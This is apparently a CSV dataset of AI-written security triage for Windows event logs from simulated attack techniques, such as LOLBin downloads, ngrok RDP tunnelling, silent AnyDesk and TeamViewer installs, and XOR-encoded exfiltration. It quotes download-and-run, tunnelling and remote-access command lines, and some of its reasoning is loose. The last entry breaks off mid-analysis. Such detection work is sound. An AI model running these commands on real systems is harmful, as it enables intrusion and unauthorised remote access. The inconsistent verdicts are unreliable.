Directory Name,AI Response
Download a file with IMEWDBLD.exe,"Upon reviewing the provided logs, several entries appear to indicate potentially suspicious or unusual activities:

1. **PowerShell Activity**:
   - A PowerShell command was executed with the following command line: `powershell.exe & {$imewdbled = $env:SystemRoot + ""\\System32\\IME\\SHARED\\IMEWDBLD.exe"" & $imewdbled https://raw.githubusercontent.com/file/file-file/master/files/data/data.yaml}`.
   - This command downloads and executes a script from a URL. Executing scripts from unknown or unverified URLs via PowerShell is a common tactic used by attackers to deploy malware.

2. **Process Execution**:
   - Multiple instances of processes such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` were executed by the user `SERVER002\\admin_test`.
   - Out of these, `wevtutil.exe` is occasionally used for malicious purposes such as clearing event logs. The frequent execution of they `wevtutil.exe` is suspicious and warrants additional investigation.

3. **Potential Privilege Escalation**:
   - Security log events show that the user `admin_test` was granted several high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which could indicate an attempt at privilege escalation.

4. **Service Interruptions**:
   - The `edgeupdate` service was stopped a couple of times during the logging period. While this might not necessarily indicate malicious activity, frequent service stoppages can sometimes be related to conflict-inducing activities such as unauthorized patching or updates.

5. **Network Activity**:
   - Logon events (EventID 4624) indicate successful logons and are associated with the `NTLM` authentication package on workstation `DESKTOP-3HL5B2P` with the IPv6 address `fe80::e3b5:5371:12a8:9c77`. This might warrant verification of known devices and expected network configurations to rule out any unauthorized access.

Overall, the combination of PowerShell script executions that download external content, the use of `wevtutil.exe`, and elevated privileges assigned to `admin_test` strongly suggests potential malicious activities.

Conclusion: **MALICIOUS**
- Confirm the source of the suspicious PowerShell script and evaluate network interactions.
- Investigate the activities of `admin_test`, especially concerning high privileges and `wevtutil.exe` usage.
- Monitor future behaviors from involved hosts and the user for malicious activities.
- Conduct a deeper forensic analysis to identify any additional indicators of compromise."
iwr or Invoke Web-Request download,"### Analysis of Windows Event Logs:

After a comprehensive analysis of the provided Windows event logs, I've identified the following points and assessments regarding potential indicators of malicious activity:

#### **1. Time Manipulation:**
- **System Log & Security Log:** There are events indicating time changes around `2024-10-24 12:28:06`. Such events might be considered suspicious in certain contexts if not correlated with authorized system maintenance or configuration changes. However, the events suggest synchronization to `time.windows.com`, which could also be part of normal operations.

#### **2. Unusual Process Execution:**
- **Sysmon Log:** There are repeated executions of `C:\\Windows\\System32\\wevtutil.exe`, `C:\\Windows\\System32\\cmd.exe`, and `C:\\Windows\\System32\\powershell.exe`:
  - `cmd.exe` is executing a PowerShell script that retrieves a file from the internet using Invoke-WebRequest (`iwr`).
  - The command line:
    ```plaintext
    ""cmd.exe"" /c powershell.exe iwr -URI https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt -Outfile %temp%\file-license.txt
    ```
    suggests PowerShell is used to download content from an external source, which may be a legitimate operation depending on context. However, this is a pattern frequently exploited in malicious activities such as downloading payloads.

#### **3. Elevated Use of PowerShell:**
- **Windows PowerShell Log:** Multiple PowerShell log entries confirm the execution of the retrieved script. The sequence within these logs reflects loading standard PowerShell functionalities which is characteristic of script executions.
  
#### **4. Log Exports with wevtutil:**
- **Sysmon Log:** The execution of `wevtutil.exe` suggests event logs were exported presumably to `C:\\Users\\ADMIN\\Temp\\TempLog.evtx`. This could potentially be interpreted as an attempt to gather logs for examination or exfiltration of log data, depending on the context. 

#### **5. Unusual Administrative Activity:**
- Activity by the user `SERVER002\\admin_test` is noticeable. If the user actions correlate with known tasks, it could be valid but needs validating due to their actions around exporting logs and downloading a script.

#### **Threat/Risk Assessment:**
- **Potential Data Exfiltration:** The usage of PowerShell to download files from external sources could indicate attempted data exfiltration or the staging of subsequent malicious payloads.
- **Investigational Leads:** The purpose of the files downloaded, and the intent behind the use of `wevtutil` needs to be further examined to ascertain if any sensitive information might have been targeted.
  
### Conclusion:
Based on the analysis above, events within the logs exhibit behavior often associated with initial stages of a compromise or intrusion, such as data acquisition or lateral movement.

#### **Resolution: SUSPICIOUS**
Given the context's potential for benign activity, but indicator overlap with potential compromise characteristics:
- **Recommendation:** Conduct further investigation to confirm the intent and context of actions performed by `SERVER002\\admin_test`. Review access logs and cross-verify any other administrative actions taken by relevant personnel to ensure that operations were expected and authorized. Check for any corresponding alerts from endpoint security solutions or network monitoring that might indicate related activity."
Lolbas replace.exe use to copy UNC file,"Upon analyzing the provided logs, here is a detailed assessment:

### Anomalous Behavior:
1. **Frequent Execution of Core System Utilities:** 
   - Multiple instances of system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` are repeatedly executed by the user `SERVER002\admin_test`. The instances seem to be executed in quick succession, which could either indicate automated scripts running or potentially malicious activity.
   
2. **Suspicious Command Line in `cmd.exe`:**
   - The command line for `cmd.exe` includes operations such as deleting a file and using `replace.exe` to replace a file from a network location (\\\\127.0.0.1\\c$\\file\\files\\data\\src\\file.cab). This is suspicious as it involves removal and replacement of files that might be indicative of an attempt to hide or replace important files possibly related to a malicious being executed.

3. **Execution of `MicrosoftEdgeUpdate.exe`:**
   - There are several executions of `MicrosoftEdgeUpdate.exe` with various command-line arguments, such as `/update`, `/regsvc`, and `/regserver`, all under `NT AUTHORITY\SYSTEM`. Multiple event entries show this executable being launched from temporary directories (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUBB86.tmp`). While it’s possible for legitimate software updates, the repeated nature and temporary directory origins could hint at misuse of the update process for malicious payload delivery or execution.

### Indicators of Malicious Activity or Compromise:
- **Potential File Manipulation:** The command including the deletion of `file.cab` in the Temp directory followed by a replace operation could potentially be used to stage or execute malicious payloads.
- **Unusual System Processes Usage:** Frequent use of `conhost.exe` and `wevtutil.exe` in quick succession is not typical end-user behavior and could indicate script or malware activity.
- **Integrity Level:** Many of these processes are running at a ""High"" integrity level, which increases the risk if they are being manipulated for malicious purposes.

### Resolution:
- **SUSPICIOUS**: The activities, while not conclusively malicious, suggest a need for further investigation. 

### Recommendations:
1. **Conduct Further Analysis:**
   - Investigate the purpose and necessity of the frequent execution of `wevtutil.exe` and `conhost.exe` by `admin_test`.
   - Examine the origin and purpose of the commands run through `cmd.exe`, particularly those involving file deletions and replacements.
   - Confirm the legitimacy of the `MicrosoftEdgeUpdate.exe` processes running from temporary directories, which could indicate process injection or abuse for malicious updates.

2. **Conduct File Integrity Checks:**
   - Check the integrity and recent changes of critical system files potentially affected by the cmd actions and Microsoft Edge update processes.

3. **Review Administrative Privileges:**
   - Assess if `SERVER002\admin_test` requires the level of access it has and review login times and sources for anomalies.

4. **Enable and Review Logging:**
   - If not already configured, ensure that comprehensive logging for process execution, network connections, and file modifications is enabled and regularly reviewed."
DNS over HTTPS Large Query Volume,"Upon analyzing the provided log entries, several aspects need to be considered to determine the nature of the activity recorded:

1. **Time Synchronization Events**: The system logs contain multiple Event ID 1 and 24 entries related to time changes initiated by `svchost.exe`. These entries indicate normal time synchronization processes occurring on the system, often by the Windows Time Service (W32Time). Such actions are generally expected and do not indicate malicious activity on their own.

2. **Security Log Events**:
   - **Event ID 4624 and 4672**: These logs indicate successful and privileged logons, including one for the username `admin_test` from a remote IP address. While the logon process using NTLM can be usual in many environments, and NTLM authentication itself is common, reviewing such accounts for legitimacy in your environment is advisable. Notably, the user `admin_test` has considerable privileges, which can be valid but may elevate concern if not a recognized and authorized user.
   
3. **Potentially Malicious PowerShell Activity**: 
   - In the Sysmon and Windows PowerShell logs, there are entries showing the execution of a PowerShell script using `Invoke-WebRequest` to contact an external IP address (8.8.8.8) while resolving random hostnames. This kind of activity can indicate attempts by malware to bypass DNS and discover additional command and control URLs dynamically. Such behavior is common in malicious scripts attempting to evade detection by generating random requests.

4. **Frequent Process Executions**:
   - The Sysmon log shows numerous executions of processes associated with Microsoft Edge Update and other system-related services. These appear to be legitimate software updates or installations, typical in many environments. However, the consistency and frequency are notable, and while generally benign, they warrant confirmation that these activities are expected.

5. **Network Activity and Privilege Use**: The correlation between `admin_test` and high-integrity-level processes is potentially concerning if `admin_test` is not a well-known administrator account. The use of command line scripts and PowerShell in proximity to this account's activation requires attention.
   
**Assessment and Recommendation**:
Given the analysis, the following conclusions are drawn:
- **BENIGN**: While most logs indicate legitimate and routine operations, the PowerShell activity and remote logins present elements that need further review.
- **SUSPICIOUS**: There is suspicious behavior associated with PowerShell script execution making external connections, which could hint at malicious activity if not authorized. The administrative actions and network logons using `admin_test` should be verified.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- **Immediate Action**: Investigate the account `admin_test` to validate its legitimacy and necessity. Check for any known vulnerabilities associated with NTLM-related logons.
- **PowerShell Review**: Analyze PowerShell scripts and ensure they are sanctioned by legitimate IT purposes. Review firewall and proxy logs for any unusual outgoing connections to external IPs.
- **Further Monitoring**: Enable enhanced logging for PowerShell and network activities to capture further anomalous behavior should it continue. Consider network isolation of the host to prevent potential data exfiltration until a thorough investigation is completed."
Run ngrok,"## Detailed Analysis

### Overview

Upon reviewing the provided Sysmon logs, Windows PowerShell logs, and other associated logs, several events suggest a high likelihood of malicious activity linked to the execution and use of unauthorized tools, specifically referencing `ngrok` in conjunction with `PowerShell` scripts that typically indicate the setup of unauthorized remote tunnels.

### Suspicious or Anomalous Behavior

1. **Powershell Execution with Ngrok**:
   - There are multiple instances of PowerShell processes (`powershell.exe`) being executed with command lines that include calls to `ngrok.exe`, specifically configuring an authentication token and establishing a TCP tunnel to port 3389 (Remote Desktop Protocol - RDP), which is typically sensitive and should be monitored closely.
   - **Key Log Entries**:
     - **Sysmon Event ID 1**: Includes suspicious command line entries:
       ```plaintext
       ""powershell.exe"" & {C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null, Start-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null, Start-Sleep -s 5, Stop-Job -Name Job1 | Out-Null}
       ```
   - This signifies efforts to establish an external connection, possibly circumventing firewall restrictions to allow unauthorized external access to the system.

2. **Execution Integrity Levels**:
   - The suspicious processes are executed at a high integrity level under the user `SERVER002\\admin_test`, indicating that an account with administrative privileges was used for this purpose. This elevates the risk as it suggests potential privilege misuse.

3. **Wevtutil and Conhost Executions**:
   - Although not independently suspicious, the frequent execution of `wevtutil.exe` in conjunction with other tooling could imply attempts to manage or clear event logs to hide activity.

4. **Network Tunneling Indicators**:
   - The use of `ngrok` is common in legitimate scenarios but highly concerning in unauthorized use because it enables network tunneling and bypasses traditional network monitoring, directly impacting network security postures and introducing potential backdoors.

### Assessment

Based on the logs' events, there is a clear indication of potential compromise due to unauthorized use of networking tools (ngrok) with the intent to set up remote access channels possibly bypassing usual security configurations like firewalls. The execution of PowerShell scripts to support this action, frequently used by attackers for stealthy command execution, further corroborates malicious intentions.

### Resolution

**Resolution: MALICIOUS**

The analyzed logs show behavior consistent with malicious activity:
- Unauthorized setting up of external network tunnels.
- Involvement of potentially sensitive applications such as PowerShell for executing scripts indicative of malicious activity (scripting for network and security bypass).

### Action & Guidance

1. **Immediate Actions**:
   - Disconnect the affected system from the network to prevent further exploitation or data exfiltration.
   - Change passwords and review privileges, especially for the `admin_test` account.
   - Perform a detailed forensic analysis and malware scan on the affected system to identify potential malware and assess the full extent of the compromise.

2. **Long-term Recommendations**:
   - Implement stricter access controls and monitoring, especially around powerful scripting environments like PowerShell.
   - Use application whitelisting to block unauthorized installations and executions.
   - Monitor network anomalies and unauthorized tunneling activity with specialized network security tools.
   - Conduct a review of the network security posture considering firewall rules and external access controls.

Given the evidence and the potential risks involved, it's crucial to execute these steps promptly to mitigate potential security threats effectively."
Printer Migration Command-Line Tool UNC share folder into a zip file,"Upon analyzing the provided Windows event logs, several observations can be made:

1. **Security Log Analysis**: 
   - Logs related to Windows Time Service adjustments appear normal, as periodic time synchronization with time.windows.com is expected behavior and does not typically indicate malicious activity.

2. **Sysmon Log Analysis**:
   - The execution of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` by `SERVER002\admin_test` suggests administrative-level activities. While tools like `wevtutil.exe` can be used maliciously for clearing logs, their usage is often legitimate depending on the context.
   - The execution of `cmd.exe` with a command involving `C:\Windows\System32\spool\tools\PrintBrm.exe` is notable. While `PrintBrm.exe` is a legitimate tool used for backup and restore of printer configurations, the redirection to `\\127.0.0.1\c$\file\files\data\src\` seems unusual and warrants further investigation.
   - The sequence of process executions appears to be a series of commands normally used for system administration tasks. However, the lack of clarity on whether these actions are authorized makes this suspicious.
   
3. **System Log Analysis**:
   - The system logs accompanying these time adjustments and general tasks do not show clear evidence of compromise. There are multiple entries indicating normal kernel operations.

4. **Application Log Analysis**:
   - The application log contains an entry from the Software Protection Platform Service. This typically relates to Windows licensing or activation events, not inherently suspicious.

**Assessment**:
- The execution of typical Windows administrative utilities, especially by a user named `admin_test`, suggests potentially benign usage. However, the combination of `cmd.exe` running a somewhat unusual command with possible implications of exfiltration or unauthorized data movement elevates the suspicion level.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct further investigation into the context and intent behind the command executed via `cmd.exe`, specifically regarding where the script or commands involving `PrintBrm.exe` and file manipulations are coming from.
- Verify user `admin_test` activities and whether they align with typical responsibilities or are part of unauthorized or unexpected tasks.
- Implement monitoring to ensure these types of activities are logged and reviewed promptly in the future. Audit the use of administrative utilities to ensure all uses are legitimate.
- Follow up on the origin of these changes and possibly involve network monitoring to see if there are any outbound connections or data exfiltration attempts associated with these session activities."
OSTAP Worming Activity,"Upon reviewing the provided Windows event logs, the following observations were made:

### Suspicious Behaviors:
1. **Process Execution with Scripting:**
   - A `cmd.exe` process executed a command to create a script file using WScript and CScript. This script creation and execution sequence is highly suspicious as it follows a pattern commonly used by malware to propagate or execute payloads.
   - The script appears to simulate an ""OSTap"" worm behavior, creating testimonial files (`fileTestdata.js` and `fileTestFiledata.js`) and then deleting them. This is indicative of malicious activity, particularly in the presence of automated execution and cleanup actions.
   - Command: `""cmd.exe"" /c pushd \\localhost\C$ ...`

2. **Repeated Creation of System32 Host Processes:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes started by the user `SERVER002\admin_test`. Excessive creation of these processes without a clear administrative task can signal an attempt to hide or gain escalated permissions.

3. **Execution of Well-Known Living-Off-the-Land Binaries (LOLBins):**
   - The logs show the usage of several legitimate Windows binaries like `whoami.exe`, `hostname.exe`, `cmd.exe`, and `wscript.exe`. While not malicious by themselves, these tools can be leveraged for malicious purposes.
   - They are often used in enumeration or reconnaissance by an attacker post-exploitation.

### Event Analysis:
- **System Logs:**
  - There are multiple `svchost.exe` operations, which are standard service host process operations. However, when correlated with scripting commands seen, it implies potential misuse.
  
- **Application Logs:**
  - Routine stopping of services related to Edge Update. While typically benign, these should be reviewed in context with the Sysmon logs showing EdgeUpdate processes are executed frequently.

- **Security Logs:**
  - Time changes observed (`EventID 4616`) are initiated by `svchost.exe`, which may suggest tampering if not a routine time sync.
  
- **Sysmon Logs:**
  - A series of `EdgeUpdate` activities are observed. While frequent updates might trigger process creations, the context of misuse using Windows utilities suggests the possibility of obfuscation or misuse.
  - Detected execution of `cmd.exe` with actions aligned with scripting makes this pattern definitely suspicious.

### Assessment and Resolution:
Considering the analysis, there is strong evidence of potentially malicious behavior due to:
- The script execution patterns indicating malicious intent.
- Use of Windows binaries that align with known practices for malicious persistence and privilege escalation.
  
Thus, the resolution for this investigation is as follows:
- **MALICIOUS** 

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Quarantine the affected host to prevent propagation.
   - Conduct full disk scans with updated antivirus and endpoint protection tools.
   - Review other systems for similar signs and coordinate a network-wide analysis to trace possible origins or entry points.
   
2. **Further Investigation:**
   - Analyze network traffic logs for unauthorized data exfiltration.
   - Examine user accounts and privileges for unauthorized changes.
   - Perform a detailed review of file creation/modification activities around the time of the suspicious logs.

3. **Post-Incident Actions:**
   - Update the organization's security protocols and awareness training once the threat is mitigated.
   - Conduct a post-incident review to improve detection and response capabilities.

Implementing these steps will help mitigate the current threat and enhance the network's security posture against future incidents."
DNS Long Domain Query,"### Analysis

Upon reviewing the provided logs, there are a few points of interest that warrant analysis for potentially suspicious or malicious activity:

1. **PowerShell Activity:**
   - There are several PowerShell-related entries where it appears a script (`data-dns-domain-length.ps1`) was executed with parameters related to DNS queries (`-Domain 127.0.0.1.nip.io -Subdomain filefilefilefilefileredte -QueryType TXT`). The use of PowerShell for executing scripts with DNS-related functionality can sometimes be indicative of post-exploitation activities or data exfiltration techniques, as PowerShell is a common tool used by attackers.

2. **Elevation of Privileges:**
   - The security log contains an event (ID: 4672) indicating that user `admin_test` was granted special privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and others. These privileges allow users to perform actions that generally require higher security permissions. While it's common for administrative accounts to have elevated privileges, any unusual use by a non-system or non-administrative process could be worth investigating.

3. **System Executables:**
   - Various system executables such as `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `TiWorker.exe` appear in the logs. These entries are generally benign if they align with regular administrative or system updates. However, their presence alongside PowerShell execution and privilege escalation demands further scrutiny.

4. **Edge Update Activities:**
   - Multiple entries in the Sysmon logs suggest frequent executions of `MicrosoftEdgeUpdate.exe` and related update activities. These could be routine software update processes, but given the context of the other unusual activities, any atypical patterns in software updates could indicate attempts to introduce or camouflage malicious software updates.

### Assessment

- **PowerShell Script Execution:** The specific use of PowerShell with custom scripts and DNS queries is unusual in standard operations and could point to potential recon or command-and-control communication.
- **Privilege Escalation Alert:** The assignment of extensive privileges to the `admin_test` account can be normal in specific administrative contexts, but it should be verified for intention.
- **Abnormal Process Activities:** The combination of scripting and elevated privileges could hint at a breach, especially if initial access or credential abuse was performed by a malicious actor.

### Resolution

Based on the patterns observed, particularly the utilization of PowerShell for script execution and the elevated privileges granted to an account engaged in these activities, the evaluation is:

**SUSPICIOUS.**

### Guidance

- **Investigate PowerShell Activity:** Confirm what `data-dns-domain-length.ps1` script entails and its operation context. Verify its legitimacy and origin.
- **Review Privileges and Account Activities:** Assess if the privilege escalation event was legitimate. If possible, review session logs or actions performed by `admin_test` around the time of increased privileges.
- **Monitor for Signs of Lateral Movement or Persistence:** As `admin_test` engages in activities involving high privilege commands, ensure there are no additional signs of persistence setup or credential theft.
- **Software Update Examination:** Ensure all update actions, particularly involving Edge, are legitimate and sourced from official channels to prevent trojanized updates.
- **Conduct a Threat Hunt:** Engage in a broader scan of the network to confirm there's no wider compromise, given the mixed signals of legitimate processes coupled with suspicious scripts."
XOR Encoded data,"### Analysis of Provided Windows Event Logs

#### 1. **Application Log Analysis**
- The Software Protection Platform Service indicates no unusual activity; it's related to licensing and activation services.

#### 2. **System Log Analysis**
- Several events capture minor time changes with the **Microsoft-Windows-Kernel-General** and **Microsoft-Windows-Time-Service**. Such adjustments are typically benign, however, consistent manipulation could suggest time-stamping obfuscation in attacks.
- There is no indication of privilege escalation or unusual service behavior.
  
#### 3. **Security Log Analysis**
- Event 4616 marks time change events. Such actions could be benign if system time is synchronized correctly or adjusted by administrative policies.

#### 4. **Sysmon Log Analysis**
- **Usage of svchost.exe, conhost.exe, hostname.exe, and whoami.exe**:
  - The use of **svchost.exe** and **conhost.exe** seems typical as part of operating Windows services.
  - **hostname.exe** and **whoami.exe** are standard utilities for determining machine name and logged-in user, respectively, often used in benign scripts.
  
- **PowerShell Activity**:
  - A notable script command from PowerShell logs demonstrates execution of a base64-encoded string that appears to collect system-directory info (from a user ""victim"") using XOR encryption with a static key, and exports this data via HTTP POST to an external URI (`example.com`). This is potential data exfiltration and clear evidence of malicious behavior.
  
#### 5. **Windows PowerShell Log**
- The logs demonstrate PowerShell sessions executing similar scripts aimed at obfuscation and exfiltration using XOR encoding, a sign of malicious scripting aimed to hide activities or data theft.

### Conclusion

Based on the analysis:

- **Malicious Activity Detected**:
  - The PowerShell command execution, coupled with the attempt to exfiltrate collected data via an external request, is a strong indicator of a compromise, signaling a potential breach.

### Resolution
- **Final Assessment**: **MALICIOUS**

### Actionable Recommendations:
1. **Immediate Response**: Isolate the affected system from the network to prevent further data exfiltration.
2. **Detailed Investigation**: Conduct forensic analysis to determine the extent of data accessed or exfiltrated.
3. **Patch and Update**: Ensure all systems and software are up-to-date to patch any vulnerabilities.
4. **User Education**: Conduct awareness training to recognize suspicious activities like unexpected PowerShell scripts.

By addressing these aspects, the security posture of the organization can be sufficiently strengthened to mitigate similar threats in the future."
TeamViewer Files Detected Test on Windows,"**Analysis of the Windows Event Logs:**

**Indicators of Malicious Activity:**

1. **PowerShell Events (EventID: 600):**
   - Anomalous PowerShell activity was identified, where a command was executed to download and install a file named `TeamViewer_Setup.exe` from the internet using `Invoke-WebRequest`.
   - This activity leveraged PowerShell to directly download and execute an installer silently (`/S` flag). This is a classic tactic often used in malicious scenarios to deploy unauthorized software.
   
2. **Sysmon Logs (EventID: 1 and 5):**
   - Process creation logs show direct execution of the downloaded `TeamViewer_Setup.exe` followed by the execution of secondary processes like `TeamViewer_.exe`. 
   - This is followed by creating scheduled tasks via `schtasks.exe` to ensure persistence through system restarts, which is suspicious as it aligns with techniques used to maintain unauthorized software foothold on a system.
   
3. **Scheduled Task Creation:**
   - The logs indicate the usage of `schtasks.exe` to create a persistent task named `TVInstallRestore`, which runs TeamViewer executable on logon. This is a strong indicator of stealthy software installation.
   - The intent to restore installations or modifications at login is often used to maintain persistence in intrusion scenarios.

4. **TeamViewer Execution:**
   - Multiple instances of TeamViewer processes like `tv_x64.exe`, `TeamViewer_Service.exe`, and `TeamViewer.exe` are observed, indicating potential unauthorized remote control capabilities being activated.
   - While TeamViewer itself is not inherently malicious, its unauthorized, silent installation through PowerShell and follow-up actions raise strong suspicions.

5. **Privileged Account Activity:**
   - Security logs show admin-like user privilege activities (SIDs ending in -500 and -1006 related to `Administrator` and `admin_test` accounts) which indicate elevated privilege contexts were being used, possibly aligning with these anomalous activities.

**Assessment and Resolution:**

Upon examining the entries in different logs, there are several indicators that the activities were suspicious or potentially malicious. The act of downloading, installing, and setting up a TeamViewer executable without clear authorization, paired with detected persistence tactics, leads to the conclusion that:

- **Resolution: MALICIOUS**

Based on the observed behaviors such as unauthorized software installation, persistent task creation, and potential unauthorized remote access setup using TeamViewer, further actions are necessary to ensure the integrity and security of the system.

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Isolate the affected system from the network to prevent potential further unauthorized access or data exfiltration.
   - Conduct a full antimalware scan to detect and mitigate any potential threats introduced.

2. **Review Installed Software:**
   - Validate all installed applications and remove any unauthorized or suspicious software (TeamViewer in this case, since it was installed outside standard procedures).

3. **Investigate User Accounts:**
   - Review the activity of privileged account activities to ensure they align with expected administrative activities.
   - Investigate any unauthorized access attempts or login events.

4. **Enhance Monitoring and Security:**
   - Implement tighter PowerShell execution policy restrictions and ensure that logging is configured to capture and alert on risky activities.
   - Consider deploying endpoint detection and response (EDR) solutions for enhanced visibility.

5. **Follow-Up Investigation:**
   - Conduct a detailed forensic analysis of the events preceding and succeeding this activity to identify any lateral movement or further compromises.
   - Assess the need to perform full incident response steps following organizational policy and standards."
Tor Proxy Usage - Windows,"### Analysis of Windows Event Logs

Here is a detailed analysis based on the provided Windows event logs from the System, Application, Windows PowerShell, Security, and Sysmon logs:

#### Windows Update Events
- **System Log**: The Windows Update Client (EventID: 44) shows various updates being checked or processed. This includes typical update titles such as Microsoft.VCLibs.140.00, Microsoft.NET.Native.Runtime.2.2, etc. These events are normal and part of routine system operations.
  
#### Application & Kernel Events
- **Application Log**: Security Provider events (EventID: 16394) and SecurityCenter events are logged, indicating that Windows Defender is active (SECURITY_PRODUCT_STATE_ON). This is standard behavior for a healthy system.
- **Kernel General Events (EventID: 16)** show registry operations without any apparent anomalies.

#### Security Log (Suspicious Activity)
- **Security Log**: Contains multiple `EventID: 4624` (An account was successfully logged on) with `LogonType: 5`, indicating service logons by SYSTEM and SERVER002$. This could be seen in normal service operations.
- **EventID: 4798/4799**: Multiple entries querying user account group memberships via taskhostw.exe and CompatTelRunner.exe. These services typically shouldn't query user groups repeatedly within short time spans. Although this activity can surface during specific telemetry tasks, it needs closer examination due to the involved processes like CompatTelRunner.
- There are recurring failed credential reads for a Microsoft Account: `02txoixylodcstop`. This could indicate automated or unauthorized script execution attempts, though it's without successful access.

#### Windows PowerShell Log
- **PowerShell Activity**: The execution of PowerShell commands invoking external applications (`tor.exe`) raises suspicion. The use of `invoke-expression` to launch Tor through the command line, along with sleep and stop-process commands, is a common technique used in malicious scripts to obfuscate behavior or maintain persistence stealthily. Additionally, running encoded PowerShell commands from temporary directories indicates potentially unauthorized or malicious scripting activities.

#### Sysmon Log (Malicious Activity)
- **Process Creations**: 
  - Frequent utilization of applications like `cmd.exe` and `conhost.exe` associated with PowerShell and external applications (tor.exe) indicators are highly suspicious. 
  - Direct execution of `tor.exe` from a temporary directory using command-line arguments is typically considered malicious if not explicitly authorized for use on the server.
  - Several processes (e.g., `CompatTelRunner.exe`) typically involved in telemetry collection are seen repeatedly, which could be used for persistence mechanisms in APT (Advanced Persistent Threat) operations.

### Assessment

Based on the analysis of the above logs and the highlighted suspicious activities specifically targeting the use of PowerShell and non-standard process executions:

- **Resolution**: **MALICIOUS**

### Recommendations
- Immediately investigate the user accounts, especially the `admin_test`, for unauthorized access or tampering.
- Review and potentially quarantine the system with identifiers such as `Server002`.
- Conduct a thorough malware scan and consider using a tool like Sysinternals Suite to gather more detailed insights on running processes.
- Evaluate group policy settings to restrict execution of unauthorized scripts and review audit logs regularly.
- Implement strict process execution policies and PowerShell script restrictions across all systems to prevent arbitrary code execution. 

Building a comprehensive incident response strategy should be prioritized to prevent further unauthorized activity. It is crucial to act swiftly to preserve system integrity and data confidentiality."
File Download with Sqlcmd.exe,"After analyzing the provided Windows event logs, I have identified some concerning patterns and behaviors that warrant a detailed assessment:

1. **Unusual PowerShell Activity**:
   - The PowerShell logs show a command execution `""powershell.exe & {sqlcmd -i https://github.com/file/file-file/raw/master/files/data/src/data.zip -o C:\\data.zip}""`. This command attempts to download a file from a remote URL and save it locally. Such behavior is often linked to attempts by malicious actors to download and execute additional payloads.
   - The use of PowerShell for downloading and possibly executing scripts or binaries from external sources is a common attacker technique for initial foothold or establishing persistence.

2. **Process Execution and Sysmon Logs**:
   - The logs indicate multiple Sysmon events related to the execution of system binaries like `wevtutil.exe`, `conhost.exe`, and multiple PowerShell invocations under the user `SERVER002\\admin_test`. While these binaries can be used for legitimate purposes, combined with the downloading activity seen in the PowerShell logs, they could suggest attempts to manipulate or gather event logs, a tactic often used to hide malicious activities.
   - Additionally, there are multiple instances of `Edge` setup execution, which might indicate legitimate software updates, but when evaluated in context with abnormal PowerShell activities, it raises suspicion, particularly regarding the execution from `EDGEMITMP_39088.tmp\\setup.exe`.

3. **Abnormal Execution Context**:
   - The logs show most activities, like launching `whoami.exe` and `HOSTNAME.EXE`, are executed with high integrity levels. This could point towards privilege escalation attempts or reconnaissance to understand the environment’s context fully.

Given the PowerShell command's intent to download from a non-standard source, the frequency and context of process executions, and the potential use of tools that might relate to log tampering or system information gathering, this set of logs clearly indicates suspicious activity.

**Final Assessment: SUSPICIOUS**

### Recommendations:

- **Immediate Actions**:
  - Isolate the host to prevent any potential lateral movement if it is part of a wider network.
  - Conduct a deeper forensic analysis to verify the origin and content of the downloaded file from the URL.
  - Examine any changes or tampering within key system and security logs.

- **Long-term Actions**:
  - Implement monitoring solutions to catch similar PowerShell execution attempts and network calls to suspicious domains.
  - Review user privilege levels on sensitive systems to prevent unauthorized command executions.
  - Regularly update endpoint protection rules to catch such potentially malicious activities."
AnyDesk Files Detected Test on Windows,"Upon careful examination of the provided Windows event logs, I have identified several points of interest:

1. **PowerShell Activity**: There's a suspicious PowerShell command noted in the logs that involves downloading `AnyDesk.exe` from an external URL (`https://download.anydesk.com/AnyDesk.exe`) and executing it with the `/S` flag, which typically indicates silent installation. This could be indicative of unauthorized remote access setup or malware distribution.
   
   - **Event Record ID 1043-1049 (Windows PowerShell Log)**: This sequence shows the execution of a PowerShell script designed to download and execute AnyDesk:
     - `Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe`
     - `Start-Process $file1 /S`

2. **Sysmon Activity**: Correlating with the PowerShell activity, there are further logs in Sysmon indicating the execution of AnyDesk.exe from the Desktop path:
   - **Event Record ID 17984, 17987-17988 (Sysmon Log)**: Shows AnyDesk.exe being executed by the user `admin_test` with high integrity context, which suggests that it ran with elevated privileges.

3. **Edge Update Logs**: The logs show multiple activities related to `MicrosoftEdgeUpdate.exe`, which are generally benign if they are legitimate updates. However, given the context of suspicious activities described above, it's critical to ensure these updates are genuine and not being used as a cover for executing unauthorized activities.

**Assessment:**

- The presence of AnyDesk.exe being downloaded and executed silently is highly suspicious. This type of activity is commonly associated with unauthorized remote access or potential malware execution. 
- The sequence of events suggests that a user or a process executed a script to introduce and possibly run a remote management tool without direct administrative consent or operational necessity.

**Conclusion**:

- **Resolution**: MALICIOUS
  - Indicators of possible unauthorized remote access setup using AnyDesk.
  - Suspicious use of PowerShell to execute commands for downloading and running software from an external source.

**Guidance**:

- Immediately verify the intent and legitimacy of the AnyDesk installation on the server and determine if any policies were bypassed.
- Conduct a full security audit on the host to check for any other unauthorized tools or malware.
- Review the system for other potential breaches and unauthorized access points.
- Consider isolating this machine from the network until a comprehensive assessment is completed.
- If this was an unauthorized action, revoke the necessary credentials and begin security incident protocol measures."
GoToAssist Files Detected Test on Windows,"**Analysis of Logs:**

The provided Windows event logs contain several activities that need careful analysis. These include system and application logs, as well as logs from Sysmon and PowerShell activities. Here is a breakdown of key observations:

1. **Installation Activity:**
   - The logs show the installation of GoTo Opener through the MSI installer (`GoToOpener.msi`), a legitimate tool used for remote assistance, distributed by LogMeIn, Inc.
   - The application was installed successfully without any evident issues or errors.

2. **PowerShell Activity:**
